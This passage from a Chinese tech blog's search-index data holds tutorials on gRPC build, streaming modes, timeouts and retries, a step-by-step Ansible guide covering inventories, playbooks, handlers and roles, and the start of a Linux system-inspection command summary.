https://github.com/grpc/grpc/blob/master/BUILDING.md\n\n```bash\n# 安装xcode command line tools\nsudo xcode-select --install\n# 先安装必备的软件\nbrew install autoconf automake libtool shtool gflags\n\n# 下载官方代码并更新依赖\ngit clone https://github.com/grpc/grpc\ngit submodule update --init\n\n# 编译并且安装\nLIBTOOL=glibtool LIBTOOLIZE=glibtoolize make\nsudo make install\n```\n\n我们先进入hellworld例子\n\n```bash\ncd examples/cpp/hellworld/\nmake\n\n# make过程中可以看到会先生成helloworld.pb.cc\nprotoc -I ../../protos --cpp_out=. ../../protos/helloworld.proto\n```\n\n还可以这样生成:\n\n```bash\nprotoc --cpp_out=. helloworld.proto\nprotoc --grpc_out=. --plugin=protoc-gen-grpc=`which grpc_cpp_plugin` helloworld.proto\n```\n\n### 2.3 python版本\n\n```bash\nsudo python3 -m pip install grpcio\nsudo python3 -m pip install grpcio-tools\npython3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. helloworld.proto\n```\n\n\n\n# 3. grpc问题\n\n### 3.1 通信方式\n\ngRPC 允许你定义四类服务方法:\n\n   1. 简单RPC（Simple RPC）：即客户端发送一个请求给服务端，从服务端获取一个应答，就像一次普通的函数调用。\n\n      ```\n      rpc SayHello(HelloRequest) returns (HelloResponse){\n      }\n      ```\n\n   2. 服务端流式RPC（Server-side streaming RPC）：一个请求对象，服务端可以传回多个结果对象。即客户端发送一个请求给服务端，可获取一个数据流用来读取一系列消息。客户端从返回的数据流里一直读取直到没有更多消息为止。\n\n      ```\n      rpc LotsOfReplies(HelloRequest) returns (stream HelloResponse){\n      }\n      ```\n\n   3. 客户端流式RPC（Client-side streaming RPC）：客户端传入多个请求对象，服务端返回一个响应结果。即客户端用提供的一个数据流写入并发送一系列消息给服务端。一旦客户端完成消息写入，就等待服务端读取这些消息并返回应答。\n\n      ```\n      rpc LotsOfGreetings(stream HelloRequest) returns (HelloResponse) {\n      }\n      ```\n\n      \n\n   4. 双向流式RPC（Bidirectional streaming RPC）：结合客户端流式rpc和服务端流式rpc，可以传入多个对象，返回多个响应对象。即两边都可以分别通过一个读写数据流来发送一系列消息。这两个数据流操作是相互独立的，所以客户端和服务端能按其希望的任意顺序读写。\n\n      ```\n      rpc BidiHello(stream HelloRequest) returns (stream HelloResponse){\n      }\n      ```\n\n### 3.2 超时\n\ngo里面一般会使用Context进行超时控制以及参数传递, 其中超时控制可以使用context.WithDeadline()或者context.WithTimeout()实现, 二者实现效果是一致的。\n\ngRPC基本上所有的对外函数都是带context参数的, 所以说它默认就集成了context的功能, 我们只需要在调用方法的时候传入 ctx 参数便可。\n\n+ WithTimeout 只能设置在某一段时间后超时，比如3秒后超时。\n\n+ WithDeadline() 则可以设置到具体某个时间点, 比如在临晨0点10分20秒的时候返回。\n\n### 3.3 重试\n\ngRPC 中已经内置了 retry 功能，客户端需要通过`grpc.WithDefaultServiceConfig()`配置 retry 功能, 并且设置环境变量`export GRPC_GO_RETRY=on`\n\n+ client.go\n\n```go\nfunc main() {\n\t// method 可以不指定 即当前service下的所以方法都使用该配置。\n\tretryPolicy := `{\n\t\t\"methodConfig\": [{\n\t\t  \"name\": [{\"service\": \"pb.Greeter\",\"method\":\"SayHello\"}],\n\t\t  \"retryPolicy\": {\n\t\t\t  \"MaxAttempts\": 4,\n\t\t\t  \"InitialBackoff\": \".01s\",\n\t\t\t  \"MaxBackoff\": \".01s\",\n\t\t\t  \"BackoffMultiplier\": 1.0,\n\t\t\t  \"RetryableStatusCodes\": [ \"UNAVAILABLE\" ]\n\t\t  }\n\t\t}]}`\n\n\tconn, err := grpc.Dial(address,grpc.WithDefaultServiceConfig(retryPolicy))\n\tif err != nil {\n\t\tlog.Fatalf(\"did not connect: %v\", err)\n\t}\n\tdefer conn.Close()\n}  \n```\n\n### 3.4 拦截器\n\n拦截器（interceptor）是grpc提供给开发者便于在每个RPC请求前中后进行如认证、鉴权、统计等功能的机制，熟悉Gin框架的同学的可以把拦截器理解为gin.HandlerFunc中间件，只不过grpc由于是双向通信，所以客户端和服务端都可以使用interceptor。\n\n拦截器主要划分为两种，一元拦截器（unary interceptor）和流拦截器（stream interceptor），区别就是在于有没有rpc使用stream。\n\n\n\n# 4. 参考资料\n\n- https://grpc.io/docs/quickstart/\n- https://github.com/grpc-ecosystem/go-grpc-middleware\n- https://github.com/openzipkin/zipkin","tags":["grpc"],"categories":["4_golang实战"]},{"title":"ansible部署的实践","url":"%2Fp%2F18605da6.html","content":"\n\n\n### 1. ansible 安装\n\n在 ansible 的世界里，我们会通过 inventory 档案来定义有哪些 managed node (被控端)，并借由 ssh 和 python 进行沟通。换句话说，当 control machine (主控端) 可以用 ssh 连上 managed node，且被连上的机器里有预载 python 时，ansile 就可以运作了.\n\n+ 控制端\n\n```bash\nsudo apt install ansible #linux\nbrew install ansible # mac\n```\n\n+ 被控端\n\n  要安装 python, 并且能被控制端 ssh \n\n<!-- more -->\n\n### 2. ansible 配置\n\nansible的默认配置文件路径为 /etc/ansible，然而，一个常见的用途是将其安装在一个virtualenv中，在这种情况下，我们一般不会使用这些默认文件。我们可以根据需要在本地目录中创建配置文件。\n\n##### 2.1 inventory文件\n\n您可以创建一个inventory文件，用于定义将要管理的服务器。这个文件可以命名为任何名字，但我们通常会命名为hosts或者项目的名称。 \n\n在hosts文件中，我们可以定义一些要管理的服务器。这里我们将定义我们可能要在“web”标签下管理的两个服务器。标签是任意的。\n\n```bash\n[web]\n192.168.22.10\n192.168.22.11\n```\n\n现在，让我们将hosts文件设置为指向本地主机local和remote虚拟远程主机。 \n\n```bash\n[local]\n127.0.0.1\n\n[remote]\n192.168.1.2\n```\n\n### 3. ansible 使用\n\n我们开始对服务器运行任务。ansible会假定你的服务器具有ssh访问权限，通常基于ssh-key。因为ansible使用ssh，所以它需要能够ssh连接到服务器。但是，ansible将尝试以正在运行的当前用户身份进行连接。如果我正在运行ansible的用户是ubuntu，它将尝试以ubuntu连接其他服务器。\n\nNote: 控制端和被控端的用户很显然会不一样。\n\n```bash\nwhoami # levonfly\n\nansible -i ./hosts --connection=local local -m ping\n127.0.0.1 | SUCCESS => {\n    \"changed\": false,\n    \"ping\": \"pong\"\n}\n\n\nansible -i ./hosts remote -m ping\n192.168.1.2 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: ssh: connect to host 192.168.1.2 port 22: Operation timed out\\r\\n\",\n    \"unreachable\": true\n}\n```\n\n\n\n+ 使用–connection=local告诉ansible不尝试通过ssh运行命令，因为我们只是影响本地主机。但是，我们仍然需要一个hosts文件，告诉我们连接到哪里。 \n\n+ 在任何情况下，我们可以看到从ansible得到的输出是一些json，它告诉我们task（我们对ping模块的调用）是否进行了任何更改和结果。\n\n\n\n命令说明：\n\n```bash\n-i ./hosts \t\t\t\t# 设置库存文件，命名为 hosts\nremote，local，all # 使用这个标签的下定义的服务器hosts清单文件。“all”是针对文件中定义的每个服务器运行的特殊关键字, 注意all比较特殊\n-m ping # 使用“ping”模块，它只是运行ping命令并返回结果\n-c local| --connection=local # 在本地服务器上运行命令，而不是SSH\n\n一些常用命令：\n-i PATH --inventory=PATH # 指定host文件的路径，默认是在/etc/ansible/hosts\n--private-key=PRIVATE_KEY_FILE_PATH # 使用指定路径的秘钥建立认证连接\n-m DIRECTORY --module-path=DIRECTORY #指定module的目录来加载module，默认是/usr/share/ansible\n-c CONNECTION --connection=CONNECTION #指定建立连接的类型，一般有ssh ，local\n```\n\n\n\n##### 3.1 模块（modules）\n\nansible使用“模块”来完成大部分的任务。模块可以做安装软件，复制文件，使用模板等等。\n\n如果我们没有模块，我们将运行任意的shell命令，我们也可以使用bash脚本。这是一个任意shell命令看起来像在ansible（它使用的shell模块！）：\n\n```bash\n# 在本地执行ls命令\nansible -i ./hosts local --connection=local -m shell -a 'ls'\n\n127.0.0.1 | SUCCESS | rc=0 >>\nREADME.md\nhosts\nnginx.yml\nroles\n\n# 在远程安装nginx, 注意--become-user=root是改变控制端的用户, 不是被控端\nansible -i ./hosts remote -b --become-user=root -m shell -a 'yum install nginx'\n172.24.120.46 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: liuwei@172.24.120.46: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).\\r\\n\",\n    \"unreachable\": true\n}\n```\n\n命令说明:\n\n```bash\n-b # “成为”，在运行命令时告诉可以成为另一个用户。\n--become-user=root # 以用户“root”运行以下命令, 是改变控制端的用户, 不是被控端!!!\n\n-a #用于将任何参数传递给-m定义的模块\n```\n\n\n\n要在centos服务器上安装软件，“yum”模块将运行相同的命令，但确保幂等。\n\n```bash\n# 指定root用户yum安装nginx\nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u root -k\n\nNo config file found; using defaults\nSSH password: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n\n\n# 指定普通用户yum安装nginx, 并且输入sudo密码\nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u liuwei -k -s -K \nSSH password: xxx\nSUDO password[defaults to SSH password]: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n```\n\n命令说明:\n\n```bash\n-v   \t # verbose mode, (-vvv for more, -vvvv to enable connection debugging)\n-m apt # 使用apt模块\n-a 'name=nginx state=installed update_cache=true' # 提供apt模块的参数，包括软件包名称，所需的结束状态以及是否更新软件包存储库缓存\n\n常用命令：\n-u USERNAME | --user=USERNAME #指定被控端的执行用户\n-k | --ask-pass  #提示输入ssh的密码，而不是使用基于ssh的密钥认证\n\n-s | --sudo  #指定用户的时候，使用sudo获得root权限\n-K | --ask-sudo-pass #提示输入sudo密码，与--sudo一起使用\n```\n\n这将使用yum模块来更新存储库缓存并安装nginx（如果没有安装）。 运行任务的结果是”changed”: false。这表明没有变化; 我已经使用该shell模块安装了nginx 。好的是，我可以一遍又一遍地运行这个命令，而不用担心它会改变预期的结果 - nginx已经安装，ansible知道，并且不尝试重新安装它。 \n\n\n\n##### 3.2 剧本（playbooks）\n\nplaybook可以运行多个任务，并提供一些更高级的功能。让我们将上述任务移到一本剧本中。在ansible中剧本（playbooks）和角色（roles）都使用yaml文件定义。 \n\nnginx.yml：(通过yaml写所需参数)\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n```\n\n\n\n这将使用inventory文件中[remote]标签下的服务器hosts。在我们的tasks文件中使用become并become_user再次使用ansible来sudo以root用户身份运行命令，然后传递playbook文件。使用一个yaml playbook文件，我们需要使用这个ansible-playbook命令：\n\n\n\n```bash\nansible-playbook -i ./hosts nginx.yml -k -K\nSSH password:\nSUDO password[defaults to SSH password]:\n\nPLAY [remote] ***************************************************************************************************************************************************************************\n\nTASK [Gathering Facts] ******************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nTASK [Install Nginx] ********************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nPLAY RECAP ******************************************************************************************************************************************************************************\n172.24.120.46              : ok=2    changed=0    unreachable=0    failed=0\n```\n\n我们在运行过程中获得了一些有用的反馈，包括“可执行任务”运行及其结果。在这里我们看到所有运行都ok，但没有改变。\n\n\n\n##### 3.3 处理程序（handlers）\n\n处理程序与任务完全相同（它可以做task可以做的任何事），但只有当另一个任务调用它时才会运行。您可以将其视为事件系统的一部分; 处理程序将通过其侦听的事件调用进行操作。 这对于运行任务后可能需要的“辅助”操作非常有用，例如在配置更改后安装或重新加载服务后启动新服务。\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n     notify: #复制的时候, 要注意空格, 对齐\n      - Start Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n```\n\n这里我们添加一个notify指令到安装任务。这将在任务运行后通知名为“Start Nginx”的处理程序。然后我们可以创建名为“Start Nginx”的处理程序。此处理程序是通知“Start Nginx”时调用的任务。 这个特定的处理程序使用服务模块，它可以启动，停止，重启，重新加载（等等）系统服务。在这种情况下，我们告诉ansible，我们要启动Nginx。 \n\n+ 如果我已经安装了nginx，则安装nginx任务将不会运行，通知程序也将不会被调用。\n\n\n\n##### 3.4 更多的任务（more tasks）\n\n接下来，我们可以为此playbook添加更多的任务，并探索其他一些功能。\n\n```yaml\n- hosts: local\n  connection: local\n  become: yes\n  become_user: root\n  vars:\n   - docroot: /var/www/serversforhackers.com/public\n  tasks:\n   - name: Add Nginx Repository\n     apt_repository:\n       repo: ppa:nginx/stable\n       state: present\n     register: ppastable\n\n   - name: Install Nginx\n     apt:\n       pkg: nginx\n       state: installed\n       update_cache: true\n     when: ppastable|success\n     notify:\n      - Start Nginx\n\n   - name: Create Web Root\n     file:\n      path: '{{ docroot }}'\n      mode: 775\n      state: directory\n      owner: www-data\n      group: www-data\n     notify:\n      - Reload Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n\n    - name: Reload Nginx\n      service:\n        name: nginx\n        state: reloaded\n```\n\n现在有三个任务：\n\n```bash\nAdd Nginx Repository # 使用apt_repository模块添加Nginx稳定PPA以获取最新的稳定版本的Nginx 。\nInstall Nginx \t\t   # 使用apt模块安装Nginx。\nCreate Web Root      # 最后创建一个Web根目录。\n```\n\n新的register和when指令，可以实现在某些事情发生后让ansible执行任务的功能。\n\n您还可以注册模块操作的结果，并使用定义的变量根据注册（register）的变量值有条件（when）地执行操作。例如，注册通过shell模块运行命令的结果可以让您访问该命令的stdout。\n\n同时还使用了一个变量, docroot变量在定义vars部分。然后将其用作创建定义目录的文件模块的目标参数。需要注意的是，path配置使用括号{{ var-name }}，这是Jinja2的模板。为了使ansible能够在括号内解析Jinja2模板变量，该行必须是单引号或双引号 - 例如，path: '{{ docroot }}' 而不是path: {{ docroot }}。不使用引号将导致错误。 这个playbook可以用通常的命令运行：\n\n```\nansible-playbook -i ./hosts nginx.yml\n```\n\n\n\n### 4. ansible角色（roles）\n\n角色才是ansible的精髓, 每个人可以做出自己的角色让别人使用, 也可以通过ansible-galaxy安装其他人的角色。\n\n角色很适合组织多个相关任务并封装完成这些任务所需的数据。例如，安装nginx可能涉及添加软件包存储库，安装软件包和设置配置。 \n\n此外，真实的配置通常需要额外的数据，如变量，文件，动态模板等等。这些工具可以与Playbook一起使用，但是我们可以通过将相关任务和数据组织成一个角色（role， 相关的结构）很快就能做得更好。 \n\n角色有一个这样的目录结构：\n\n```\nroles\n  rolename\n   - files\n   - handlers\n   - meta\n   - templates\n   - tasks\n   - vars\n```\n\n在每个子目录中（eg： files，handlers等等），ansible将自动搜索并读取叫做main.yml的yaml文件。 \n\n接下来我们将分解nginx.yml文件内容为不同的组件，并将每个组件放在相应的目录中，以创建一个更干净，更完整的配置工具集。\n\n\n\n##### 4.1 创建角色（creating a role）\n\n我们可以使用ansible-galaxy命令来创建一个新角色。此工具可用于将角色保存到ansible的公共注册表，但是我通常只是使用它来在本地创建role的基础目录结构。\n\n```bash\ncd ~/ansible-example\nmkdir roles\ncd roles\nansible-galaxy init nginx\n```\n\n目录名称roles是一种惯例，在运行一个playbook时可以用来查找角色。该目录应该始终被命名roles，但并不强制。在roles目录中运行 ansible-galaxy init nginx 命令将创建新角色所需的目录和文件。\n\n我们来看看我们新建的nginx角色的每个部分~/ansible-example/roles/nginx。\n\n##### 4.2.1 文件（files）\n\nfiles目录中没有main.yml文件.  首先，在files目录中，我们可以添加我们要复制到我们的服务器中的文件。对于nginx，我经常复制h5bp的nginx组件配置。我只需从github下载最新的信息，进行一些调整，并将它们放入files目录中。\n\n```\n~/ansible-example\n - roles\n - - nginx\n - - - files\n - - - - h5bp\n```\n\n我们稍后会看到，h5bp配置文件将通过复制模块添加到服务器。\n\n\n\n##### 4.2.2 处理程序（handlers）\n\nhandlers约定必须包含main.yml文件。我们可以把曾经在nginx.yml 剧本中的定义的所有处理程序放入到handlers目录中。\n\nhandlers/main.yml 内容：\n\n```yml\n---\n# handlers file for nginx\n\n- name: Start Nginx\n  service:\n    name: nginx\n    state: started\n\n- name: Reload Nginx\n  service:\n    name: nginx\n    state: reloaded\n```\n\n一旦handlers/main.yml中的处理程序定义好了，我们可以自由地从其他的yaml配置中引用它们。\n\n\n\n##### 4.2.3 元（meta）\n\nmeta目录中约定必须包含main.yml文件。main.yml文件包含role元数据，包含的依赖关系。如果这个角色依赖于另一个角色，我们可以在这里定义。例如，nginx角色取决于安装ssl证书的ssl角色。 \n\nmeta/main.yml 内容：\n\n```yml\n---\ndependencies:\n  - { role: ssl }\n```\n\n如果我调用了“nginx”角色，它将尝试首先运行“ssl”角色。 否则我们可以省略此文件，或将角色定义为没有依赖关系：\n\n```yml\n---\ndependencies: []\n```\n\n\n\n##### 4.2.4 模板（templates）\n\ntemplates目录中没有main.yml文件，只包含.j2后缀的模板文件。 基于python的Jinja2模板引擎（和django的模板引擎很类似），模板文件可以包含模板变量。这里的文件应该以.j2为类型后缀（eg.uwsgi.j2），提倡但是不强制，也可以取其他的名字。\n\n这是一个nginx服务器（“虚拟主机”）配置的例子。请注意，它使用了稍后在vars/main.yml文件中定义的一些变量。 我们的示例中的nginx配置文件位于templates/serversforhackers.com.conf.j2：\n\n```nginx\nserver {\n    # Enforce the use of HTTPS\n    listen 80 default_server;\n    server_name {{ domain }};\n    return 301 https://$server_name$request_uri;\n}\n\nserver {\n    listen 443 ssl default_server;\n\n    root /var/www/{{ domain }}/public;\n    index index.html index.htm index.php;\n\n    access_log /var/log/nginx/{{ domain }}.log;\n    error_log  /var/log/nginx/{{ domain }}-error.log error;\n\n    server_name {{ domain }};\n\n    charset utf-8;\n\n    include h5bp/basic.conf;\n\n    ssl_certificate           {{ ssl_crt }};\n    ssl_certificate_key       {{ ssl_key }};\n    include h5bp/directive-only/ssl.conf;\n\n    location / {\n        try_files $uri $uri/ /index.php$is_args$args;\n    }\n\n    location = /favicon.ico { log_not_found off; access_log off; }\n    location = /robots.txt  { log_not_found off; access_log off; }\n\n    location ~ \\.php$ {\n        include snippets/fastcgi.conf;\n        fastcgi_pass unix:/var/run/php7.1-fpm.sock;\n    }\n}\n```\n\n这是一个相当标准的用于php应用程序的Nginx配置。这里有三个变量：`domain` `ssl_crt` `ssl_key` 这三个变量将在变量部分（vars）中定义。\n\n##### 4.2.5 变量（vars）\n\nvars目录包含一个main.yml文件, 在main.yml中我们可以列出将要使用的所有变量。 \n\nvars/main.yml：\n\n```yml\n---\ndomain: serversforhackers.com\nssl_key: /etc/ssl/sfh/sfh.key\nssl_crt: /etc/ssl/sfh/sfh.crt\n```\n\n+ Note:如果您有敏感信息添加到变量文件中，则可以使用ansible-vault加密文件。\n\n\n\n##### 4.2.6 任务（tasks）\n\ntasks目录包含一个main.yml文件, 使用角色时运行的主文件是tasks/main.yml文件。看看我们的用例将会是什么样的：\n\n```yml\n---\n- name: Add Nginx Repository\n  apt_repository:\n    repo: ppa:nginx/stable\n    state: present\n\n- name: Install Nginx\n  apt:\n    pkg: nginx\n    state: installed\n    update_cache: true\n  notify:\n    - Start Nginx # 在handler文件夹里\n\n- name: Add H5BP Config\n  copy:\n    src: h5bp\n    dest: /etc/nginx\n    owner: root\n    group: root\n\n- name: Disable Default Site Configuration\n  file:\n    dest: /etc/nginx/sites-enabled/default\n    state: absent\n\n# `dest` in quotes as a variable is used!\n- name: Add SFH Site Config\n  register: sfhconfig\n  template:\n    src: serversforhackers.com.j2\n    dest: '/etc/nginx/sites-available/{{ domain }}.conf' \n    owner: root\n    group: root\n\n# `src`/`dest` in quotes as a variable is used!\n- name: Enable SFH Site Config\n  file:\n    src: '/etc/nginx/sites-available/{{ domain }}.conf'\n    dest: '/etc/nginx/sites-enabled/{{ domain }}.conf'\n    state: link\n\n# `dest` in quotes as a variable is used!\n- name: Create Web root\n  file:\n    dest: '/var/www/{{ domain }}/public'\n    mode: 775\n    state: directory\n    owner: www-data\n    group: www-data\n  notify:\n    - Reload Nginx\n\n# `dest` in quotes as a variable is used!\n- name: Web Root Permissions\n  file:\n   dest: '/var/www/{{ domain }}'\n   mode: 775\n   state: directory\n   owner: www-data\n   group: www-data\n   recurse: yes\n  notify:\n    - Reload Nginx\n```\n\n这一系列任务使得nginx能被完整的安装。任务按照出现的顺序完成以下工作：\n\n```\n1 添加nginx / stable库\n2 安装并启动nginx\n3 添加H5BP配置文件\n4 从sites-enabled目录中删除文件的符号链接来禁用默认的nginx配置\n5 将serversforhackers.com.conf.j2虚拟主机模板复制到nginx配置中，渲染模板\n6 通过将其符号链接到sites-enabled目录来启用Nginx服务器配置\n7 创建Web根目录\n8 更改项目根目录的权限（递归），该目录位于之前创建的Web根目录之上\n```\n\n有一些新的模块（和一些我们已经涵盖的新用途），包括复制，模板和文件模块。通过设置每个模块的参数，我们可以做一些有趣的事情，例如确保文件“不存在”（如果存在则删除它们）的state: absent，或者通过创建一个文件作为符号链接的state: link。您应该检查每个模块的文档，以查看可以用它们完成哪些有趣和有用的事情。\n\n参加官方文档: https://docs.ansible.com/ansible/latest/modules/\n\n\n\n##### 4.3 运行角色（running the Role）\n\n要对服务器运行一个或多个角色，我们将重新使用另一个playbook。该playbook与roles目录位于同一个目录中，同一层级。当我们用ansible-playbook命令运行的时候需要先cd进入到该目录中。 \n\n让我们创建一个“主”的yaml文件（被ansible-playbook命令执行的文件），该文件定义要使用的角色以及运行它们的主机： 文件~/ansible-example/server.yml位于与roles目录相同的目录中：(注意是和roles目录同层级!!!!!)\n\n```yml\n---\n- hosts: local\n  connection: local\n  roles:\n    - nginx # 这个是你刚才写的nginx role\n```\n\n所以，我们只是定义角色，而不是在本playbook文件中定义所有的变量和任务。角色负责具体细节。然后我们可以运行角色：\n\n```bash\nansible-playbook -i ./hosts server.yml\n```\n\n以下是运行nginx角色的playbook文件的输出：\n\n```bash\nPLAY [all] ********************************************************************\n\nGATHERING FACTS ***************************************************************\nok: [127.0.0.1]\n\nTASK: [nginx | Add Nginx Repository] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Install Nginx] *************************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add H5BP Config] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Disable Default Site] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add SFH Site Config] *******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Enable SFH Site Config] ****************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Create Web root] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Web Root Permissions] ******************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Start Nginx] ***********************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Reload Nginx] **********************************************\nchanged: [127.0.0.1]\n\nPLAY RECAP ********************************************************************\n127.0.0.1                  : ok=8   changed=7   unreachable=0    failed=0\n```\n\n我们将所有各种组件放在一起，形成一致的角色，现在已经安装并配置了nginx！\n\n\n\n### 5. ansible事实(facts)\n\n请注意，运行剧本时的第一行总是“收集事实”。 在运行任何任务之前，ansible将收集有关其配置的系统的信息。这些被称为事实，并且包括广泛的系统信息，如CPU核心数量，可用的ipv4和ipv6网络，挂载的磁盘，Linux发行版等等。\n\n事实在“任务”或“模板”配置中通常很有用。例如，nginx通常设置为使用与cpu内核一样多的工作处理器。知道这一点，您可以选择如下设置nginx.conf.j2文件的模板：\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\n或者如果你具有多个cpu的服务器，则可以使用：\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores * ansible_processor_count }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\n所有的ansible facts全局变量都是以“anisble_”为前缀，并且可以在其他任何地方使用。 尝试对你的本地机器运行以下内容以查看可用的事实：\n\n```bash\n# Run against a local server\n# Note that we say to use \"localhost\" instead of defining a hosts file here!\nansible -m setup --connection=local localhost\n\n# Run against a remote server\nansible -i ./hosts remote -m setup\n```\n\n\n\n### 6. ansible遇到的问题总结\n\n+ 遇到角色没有的问题, ERROR! the role 'Stouts.ntp' was not found\n\n  通过ansible-galaxy安装 \n\n  ```\n  ansible-galaxy install stouts.ntp\n  ```\n\n+ ansible的全局配置ansible.cfg\n\n  如默认是否需要输入密码、是否开启sudo认证、action_plugins插件的位置、hosts主机组的位置、是否开启log功能、默认端口、key文件位置等等。\n  \n  参见: https://www.cnblogs.com/paul8339/p/6159220.htm\n\n+ host文件把一个组作为另一个组的子成员 \n\n  ```\n  [atlanta]\n  host1\n  host2\n  \n  [raleigh]\n  host2\n  host3\n  \n  [southeast:children]\n  atlanta\n  raleigh\n  \n  [southeast:vars]\n  some_server=foo.southeast.example.com\n  halon_system_timeout=30\n  self_destruct_countdown=60\n  escape_pods=2\n  \n  [usa:children]\n  southeast\n  northeast\n  southwest\n  northwest\n  ```\n\n  atlanta raleigh将作为southeast子组，继承父组southeast中some_server等变量\n\n  \n\n+ 限制脚本只在指定的ip对应的机器上执行。\n\n   -l <SUBSET>, --limit <SUBSET>\n   \n\t```bash\n   ansible-playbook myplaybook.yml -l 10.11.12.13\n   ```\n\n\n\n+ 打标签归类, 指定归类相关的task\n\n  ```yml\n  ---\n  - include: restart.yml\n    tags:\n      - tag2\n  - include: push.yml\n    tags:\n      - tag1\n  ```\n\n  tags主要目的是单独执行指定的tag，使用-t 或者--tags 表示。旧版本不是这样写的，会直接在include后面加上tags=xxx,但是在新版本的ansible执行时虽然不报错，但是也不执行该tag。\n\n\n\n### 7. 参考资料\n\n+ [非常好的Ansible入门教程（超简单）](https://blog.csdn.net/pushiqiang/article/details/78126063)\n\n+ [Ansible 快速入门](https://www.cnblogs.com/dachenzi/p/8916521.html)\n\n+ [ansible自动化运维教程](https://www.w3cschool.cn/automate_with_ansible/ )\n\n+ https://docs.ansible.com/ansible/latest/modules/ 官方文档 \n\n  \n\n","tags":["ansible"],"categories":["软件"]},{"title":"linux常用命令总结","url":"%2Fp%2F1d063ae7.html","content":"\n# 1. 查看linux系统信息\n\n### 1.1 查看系统版本\n\n```bash\n#lsb_release -a \nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 16.04.6 LTS\nRelease:        16.04\nCodename:       xenial\n\n#uname -srm  \nLinux 4.15.0-1060-gcp x86_64\n\n#cat /etc/os-release\nNAME=\"Ubuntu\"\nVERSION=\"16.04.6 LTS (Xenial Xerus)\"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=\"Ubuntu 16.04.6 LTS\"\nVERSION_ID=\"16.04\"\nHOME_URL=\"http://www.ubuntu.com/\"\nSUPPORT_URL=\"http://help.ubuntu.com/\"\nBUG_REPORT_URL=\"http://bugs.launchpad.net/ubuntu/\"\nVERSION_CODENAME=xenial\nUBUNTU_CODENAME=xenial\n\n#cat /proc/version\nLinux version 4.15.0-1060-gcp (buildd@lcy01-amd64-028) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)) #64-Ubuntu SMP Thu Mar 26 03:21:15 UTC 2020\n\n#cat /etc/issue\nUbuntu 16.04.6 LTS \\n \\l\n```\n\n<!-- more -->\n\n### 1.2 查看硬盘内存 CPU\n\n##### 1.2.1 查看硬盘\n\n```bash\n# df -h  查看磁盘空间\nFilesystem      Size  Used Avail Use% Mounted on\nudev            986M     0  986M   0% /dev\ntmpfs           200M   22M  179M  11% /run\n/dev/sda1        29G  5.6G   24G  20% /\n\n\n#fdisk -l  查看Linux中的所有磁盘分区\nDisk /dev/sda: 30 GiB, 32212254720 bytes, 62914560 sectors\nUnits: sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 4096 bytes\nI/O size (minimum/optimal): 4096 bytes / 4096 bytes\nDisklabel type: gpt\nDisk identifier: A03F431A-7AE6-406D-B233-EED234598EEE\n\nDevice      Start      End  Sectors  Size Type\n/dev/sda1  227328 62914526 62687199 29.9G Linux filesystem\n/dev/sda14   2048    10239     8192    4M BIOS boot\n/dev/sda15  10240   227327   217088  106M EFI System\n```\n\n##### 1.2.1 查看内存\n\n```bash\n# free -h 查看内存\n              total        used        free      shared  buff/cache   available\nMem:           1.9G        769M        211M         21M        1.0G        1.0G\nSwap:            0B          0B          0B\n```\n\n##### 1.2.2 查看 CPU\n\n```bash\n# lscpu\nArchitecture:          x86_64\nCPU op-mode(s):        32-bit, 64-bit\nByte Order:            Little Endian\nCPU(s):                2\n\n# cat /proc/cpuinfo   查看 CPU 信息\nprocessor       : 0\nvendor_id       : GenuineIntel\ncpu family      : 6\nmodel           : 63\nmodel name      : Intel(R) Xeon(R) CPU @ 2.30GHz\nstepping        : 0\nmicrocode       : 0x1\ncpu MHz         : 2300.000\ncache size      : 46080 KB\n\n# cat /proc/cpuinfo| grep \"processor\"| wc -l   查看 CPU 个数\n2\n```\n\n\n\n# 2. 进程端口相关\n\n### 2.1 查询进程\n\n```bash\nps     # displays processes for the current shell.\nps -ef # Display every active process on a Linux system in generic (Unix/Linux) format.\nps -aux # Display all processes in BSD format.\n```\n\n\n\n### 2.2 查询端口\n\n```bash\n#1. 这类命令一定要用sudo\n#2. a: all p: procee, t:tcp, u:udp, l:正在监听的 , n: 禁止域名解析, 只显示数字ip\nsudo netstat -anp | grep 80\nsudo netstat 